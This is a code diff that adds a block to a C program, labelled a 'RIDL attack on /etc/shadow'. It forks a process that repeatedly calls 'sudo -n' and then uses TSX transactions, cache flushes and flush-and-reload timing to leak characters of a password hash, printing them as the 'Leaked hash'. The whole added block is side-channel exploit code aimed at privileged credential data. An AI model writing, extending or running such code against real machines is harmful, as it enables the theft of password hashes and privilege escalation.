@@ -311,6 +311,62 @@ int main(void) {
 
     printf("Prefix: %s\n", b);
 
+    printf("\nStarting RIDL attack on /etc/shadow...\n");
+    
+    // Trigger shadow file access
+    if (fork() == 0) {
+        while(1) {
+            system("sudo -n echo test 2>/dev/null");
+            usleep(10000);  // 10ms
+        }
+    }
+    
+    char leaked_hash[64] = {0};
+    int hash_chars = 0;
+    
+    // Use same TAA technique but target kernel data
+    for(int attempt = 0; attempt < 1000 && hash_chars < 32; attempt++) {
+        uint32_t hits[256] = {0};
+        
+        for(int iter = 0; iter < 50; iter++) {
+            for (int i = 0; i < POSSIBLE_BYTES; i++) {
+                clflush(&crosstalk_reloadbuffer[i * STRIDE]);
+            }
+            clflush(leak + attempt);
+            sfence();
+            
+            if (_xbegin() == _XBEGIN_STARTED) {
+                size_t index = *(leak + attempt) * STRIDE;
+                *(volatile char*)(crosstalk_reloadbuffer + index);
+                _xend();
+            }
+            
+            for(int j = 48; j < 103; j++) { // 0-9, a-f for hex hash
+                uint64_t time = get_reload_time(&crosstalk_reloadbuffer[j * STRIDE]);
+                if(time < CACHE_THRESHOLD) hits[j]++;
+            }
+        }
+        
+        int best = 0, max_hits = 0;
+        for(int i = 48; i < 103; i++) {
+            if(hits[i] > max_hits) {
+                max_hits = hits[i];
+                best = i;
+            }
+        }
+        
+        if(max_hits > 5) {
+            leaked_hash[hash_chars++] = best;
+            printf("Hash char %d: %c\n", hash_chars, best);
+        }
+    }
+    
+    printf("Leaked hash: %s\n", leaked_hash);
+    // ========== END RIDL ATTACK ==========
+
+
+
+
     kill(pid, SIGKILL);
     waitpid(pid, NULL, 0);
     // puts("crosstalk done");
